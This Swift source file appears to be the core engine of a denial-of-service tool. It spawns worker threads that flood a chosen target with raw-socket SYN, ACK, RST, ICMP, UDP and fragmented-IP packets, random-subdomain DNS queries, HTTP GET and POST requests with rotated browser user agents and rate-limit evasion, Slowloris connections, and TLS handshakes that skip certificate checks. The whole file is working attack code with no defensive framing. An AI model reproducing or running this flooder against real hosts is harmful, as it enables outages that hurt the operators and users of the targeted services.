import Darwin
import Foundation
import Network
import Security

struct Snapshot: Sendable {
    var packets = [UInt64](repeating: 0, count: Vector.allCases.count)
    var bytes = [UInt64](repeating: 0, count: Vector.allCases.count)
    var errors: UInt64 = 0

    var totalPackets: UInt64 { packets.reduce(0, +) }
    var totalBytes: UInt64 { bytes.reduce(0, +) }
}

/// Shared counters and the stop flag. Workers are plain threads, so the lock
/// is the simplest correct thing; contention is one short critical section per
/// packet and the counters are only read four times a second.
final class RunState: @unchecked Sendable {
    private let lock = NSLock()
    private var snap = Snapshot()
    private var stopped = false
    private var errorCounts = [UInt64](repeating: 0, count: Vector.allCases.count)
    private var lastErrno = [Int32](repeating: 0, count: Vector.allCases.count)

    private(set) var rawAvailable = true

    var running: Bool {
        lock.lock(); defer { lock.unlock() }
        return !stopped
    }

    func stop() {
        lock.lock(); defer { lock.unlock() }
        stopped = true
    }

    func markRawUnavailable(_ v: Vector, _ code: Int32) {
        lock.lock(); defer { lock.unlock() }
        rawAvailable = false
        lastErrno[v.order] = code
        Log.error("raw", "\(v.name): raw socket failed, \(errnoText(code))")
    }

    func hit(_ v: Vector, _ n: Int) {
        lock.lock(); defer { lock.unlock() }
        snap.packets[v.order] += 1
        snap.bytes[v.order] += UInt64(n)
    }

    func error(_ v: Vector, _ code: Int32) {
        lock.lock(); defer { lock.unlock() }
        snap.errors += 1
        errorCounts[v.order] += 1
        lastErrno[v.order] = code
    }

    /// Per-vector error deltas since the last call, for the once-a-second log.
    func drainErrors() -> [(Vector, UInt64, Int32)] {
        lock.lock(); defer { lock.unlock() }
        var out: [(Vector, UInt64, Int32)] = []
        for v in Vector.allCases where errorCounts[v.order] > 0 {
            out.append((v, errorCounts[v.order], lastErrno[v.order]))
            errorCounts[v.order] = 0
        }
        return out
    }

    func snapshot() -> Snapshot {
        lock.lock(); defer { lock.unlock() }
        return snap
    }
}

enum Engine {
    static let uaPool = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    ]

    static func start(targets: [Target], vectors: [Vector], port: UInt16) -> RunState {
        let state = RunState()
        for target in targets {
            for v in vectors {
                for _ in 0..<v.workers {
                    DispatchQueue.global(qos: .userInitiated).async {
                        if v.needsRaw {
                            rawWorker(state, v, target: target, port: port)
                        } else {
                            asyncWorker(state, v, target: target, port: port)
                        }
                    }
                }
            }
        }
        return state
    }

    // MARK: - raw

    private static func rawWorker(_ state: RunState, _ v: Vector, target: Target, port: UInt16) {
        guard let dstIP = target.primary else { return }
        guard let fd = Net.rawSocket(v.proto) else {
            state.markRawUnavailable(v, errno)
            return
        }
        defer { close(fd) }

        let src = Packet.bytes(Net.localIP())
        let dst = Packet.bytes(dstIP)
        let batch = 16
        let pause = Double(batch) / Double(v.rate)

        while state.running {
            for _ in 0..<batch {
                guard state.running else { break }
                var frame: [UInt8]
                switch v {
                case .icmpFlood:
                    let body = Packet.icmp(id: Packet.randPort(), seq: Packet.randPort(), payload: randomBytes(32))
                    frame = Packet.ipHeader(src: src, dst: dst, proto: IPPROTO_ICMP, payload: body.count, id: Packet.randPort(), fragOff: 0, moreFrags: false) + body
                case .udpRaw:
                    let body = Packet.udp(src: src, dst: dst, sport: Packet.randPort(), dport: port, payload: randomBytes(24))
                    frame = Packet.ipHeader(src: src, dst: dst, proto: IPPROTO_UDP, payload: body.count, id: Packet.randPort(), fragOff: 0, moreFrags: false) + body
                case .ipFrag:
                    let body = Packet.udp(src: src, dst: dst, sport: Packet.randPort(), dport: port, payload: randomBytes(24))
                    let cut = 16
                    let head = Array(body[0..<cut])
                    let tail = Array(body[cut..<body.count])
                    let a = Packet.ipHeader(src: src, dst: dst, proto: IPPROTO_UDP, payload: head.count, id: Packet.randPort(), fragOff: 0, moreFrags: true) + head
                    let b = Packet.ipHeader(src: src, dst: dst, proto: IPPROTO_UDP, payload: tail.count, id: Packet.randPort(), fragOff: UInt16(cut / 8), moreFrags: false) + tail
                    _ = Net.sendTo(fd, a, dstIP, port)
                    frame = b
                default:
                    let flags: UInt8 = v == .synFlood ? 0x02 : (v == .ackFlood ? 0x10 : 0x04)
                    let body = Packet.tcp(src: src, dst: dst, sport: Packet.randPort(), dport: port,
                                          seq: Packet.randU32(), ack: v == .ackFlood ? Packet.randU32() : 0, flags: flags)
                    frame = Packet.ipHeader(src: src, dst: dst, proto: IPPROTO_TCP, payload: body.count, id: Packet.randPort(), fragOff: 0, moreFrags: false) + body
                }
                if Net.sendTo(fd, frame, dstIP, port) > 0 {
                    state.hit(v, frame.count)
                } else {
                    state.error(v, errno)
                }
            }
            Thread.sleep(forTimeInterval: pause)
        }
    }

    private static func randomBytes(_ n: Int) -> [UInt8] {
        var b = [UInt8](repeating: 0, count: n)
        for i in 0..<n { b[i] = UInt8.random(in: 0...255) }
        return b
    }

    // MARK: - kernel sockets

    private static func asyncWorker(_ state: RunState, _ v: Vector, target: Target, port: UInt16) {
        guard let ip = target.primary else { return }
        switch v {
        case .tcpConnect:
            while state.running {
                if let fd = Net.connect(ip, port) {
                    state.hit(v, 0)
                    close(fd)
                } else {
                    state.error(v, errno)
                }
            }
        case .udpFlood:
            guard let fd = Net.udpSocket() else {
                state.error(v, errno)
                return
            }
            defer { close(fd) }
            while state.running {
                let payload = randomBytes(1200)
                let n = Net.sendTo(fd, payload, ip, port)
                if n > 0 { state.hit(v, n) } else { state.error(v, errno) }
            }
        case .dnsFlood:
            guard let fd = Net.udpSocket() else {
                state.error(v, errno)
                return
            }
            defer { close(fd) }
            while state.running {
                let label = String((0..<Int.random(in: 6..<14)).map { _ in Character(UnicodeScalar(UInt8.random(in: 97...122))) })
                let q = dnsQuery("\(label).\(target.host)")
                let n = Net.sendTo(fd, q, ip, port)
                if n > 0 { state.hit(v, n) } else { state.error(v, errno) }
            }
        case .httpGet, .httpPost:
            while state.running {
                guard let fd = Net.connect(ip, port) else {
                    state.error(v, errno)
                    continue
                }
                Net.setRecvTimeout(fd, ms: 250)
                let body = v == .httpPost ? String(repeating: "x", count: Int.random(in: 64..<512)) : ""
                var req = "\(v == .httpPost ? "POST" : "GET") /?\(UInt32.random(in: 0...UInt32.max))=\(UInt64.random(in: 0...UInt64.max)) HTTP/1.1\r\n"
                req += "Host: \(target.host)\r\n"
                req += "User-Agent: \(uaPool.randomElement()!)\r\n"
                req += "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n"
                req += "Cache-Control: no-cache\r\nPragma: no-cache\r\n"
                if v == .httpPost {
                    req += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: \(body.count)\r\n"
                }
                req += "Connection: close\r\n\r\n\(body)"
                let bytes = Array(req.utf8)
                if Net.write(fd, bytes) {
                    state.hit(v, bytes.count)
                    var head = [UInt8](repeating: 0, count: 32)
                    let n = recv(fd, &head, head.count, 0)
                    if n > 0, let status = parseStatus(head), [429, 403, 503].contains(status) {
                        Thread.sleep(forTimeInterval: Double.random(in: 0.04...0.16))
                    }
                } else {
                    state.error(v, errno)
                }
                close(fd)
            }
        case .slowloris:
            while state.running {
                guard let fd = Net.connect(ip, port) else {
                    state.error(v, errno)
                    continue
                }
                let head = "GET / HTTP/1.1\r\nHost: \(target.host)\r\nUser-Agent: RustDoS\r\nX-Pad: \(String(repeating: "a", count: 64))\r\n"
                if !Net.write(fd, Array(head.utf8)) {
                    state.error(v, errno)
                    close(fd)
                    continue
                }
                state.hit(v, head.utf8.count)
                for _ in 0..<6 where state.running {
                    Thread.sleep(forTimeInterval: 1.2)
                    let line = "X-Keep: \(String(repeating: "b", count: 16))\r\n"
                    if !Net.write(fd, Array(line.utf8)) { break }
                    state.hit(v, line.utf8.count)
                }
                close(fd)
            }
        case .tlsFlood:
            while state.running {
                if tlsHandshake(host: target.host, ip: ip, port: port) {
                    state.hit(v, 517)
                } else {
                    state.error(v, 0)
                }
            }
        default:
            break
        }
    }

    private static func parseStatus(_ head: [UInt8]) -> Int? {
        let s = String(decoding: head, as: UTF8.self)
        let parts = s.split(separator: " ")
        guard parts.count > 1 else { return nil }
        return Int(parts[1])
    }

    private static func dnsQuery(_ name: String) -> [UInt8] {
        var v = Packet.be16(UInt16.random(in: 0...UInt16.max))
        v += [0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0]
        for label in name.split(separator: ".") where !label.isEmpty {
            let l = Array(label.utf8.prefix(63))
            v.append(UInt8(l.count))
            v += l
        }
        v += [0, 0, 1, 0, 1]
        return v
    }

    /// One TLS handshake, certificate verification skipped on purpose.
    private static func tlsHandshake(host: String, ip: String, port: UInt16) -> Bool {
        let tls = NWProtocolTLS.Options()
        sec_protocol_options_set_verify_block(tls.securityProtocolOptions, { _, _, complete in complete(true) }, DispatchQueue.global())
        sec_protocol_options_set_tls_server_name(tls.securityProtocolOptions, host)
        let params = NWParameters(tls: tls, tcp: NWProtocolTCP.Options())
        guard let nwPort = NWEndpoint.Port(rawValue: port) else { return false }

        let conn = NWConnection(host: NWEndpoint.Host(ip), port: nwPort, using: params)
        let sem = DispatchSemaphore(value: 0)
        var ok = false
        conn.stateUpdateHandler = { st in
            switch st {
            case .ready:
                ok = true
                sem.signal()
            case .failed, .cancelled:
                sem.signal()
            default:
                break
            }
        }
        conn.start(queue: DispatchQueue.global())
        let r = sem.wait(timeout: .now() + 3)
        conn.cancel()
        return r == .success && ok
    }
}
